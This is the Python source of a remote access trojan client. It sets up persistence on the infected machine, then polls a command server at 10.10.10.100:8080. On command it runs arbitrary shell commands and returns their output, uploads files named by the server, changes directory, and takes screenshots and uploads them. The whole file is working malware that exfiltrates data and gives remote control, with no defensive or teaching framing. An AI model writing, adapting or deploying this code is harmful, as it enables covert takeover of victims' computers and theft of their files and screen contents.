import requests
import time
import subprocess
import os
import tempfile
import shutil
from datetime import datetime
from persistence import set_persistence
from PIL import ImageGrab

HOST = '10.10.10.100'
PORT = 8080

def main():
    set_persistence()

    url = 'http://{host}:{port}'.format(host=HOST, port=PORT)

    while True:
        req = requests.get(url)
        cmd = req.text

        if cmd in ('exit', 'shutdown'):
            requests.post(url, data='Client is shutting down')
            break
        elif 'grab*' in cmd:
            filename = cmd.split('*')[1]
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    files = {filename: f}
                    requests.post(url + '/store', files=files)
            else:
                requests.post(url, data='[!] There was an error sending the file {filename}'.format(filename=filename))
        elif cmd.startswith('cd '):
            try:
                _, _, dir = cmd.partition(' ')
                os.chdir(dir)
                full_path = os.getcwd()
                requests.post(url + '/cwd', data='Changed dir to {}'.format(full_path))
            except Exception as e:
                requests.post(url, data='[!] There was an error setting directory\n{}'.format(e))
        elif 'screencap' in cmd:
            temp_dir = tempfile.mkdtemp()
            filename = os.path.join(temp_dir, 'img.jpg')

            ImageGrab.grab().save(filename, 'JPEG')
            files = {'file': open(filename, 'rb')}
            requests.post(url + '/store', files=files)
            files['file'].close()

            shutil.rmtree(temp_dir)
        else:
            popen = subprocess.Popen(cmd,
                                     shell=True,
                                     stderr=subprocess.STDOUT,
                                     stdout=subprocess.PIPE)
            requests.post(url, data=popen.stdout.read() or '*** No Output ***')

        time.sleep(3)

if __name__ == '__main__':
    main()
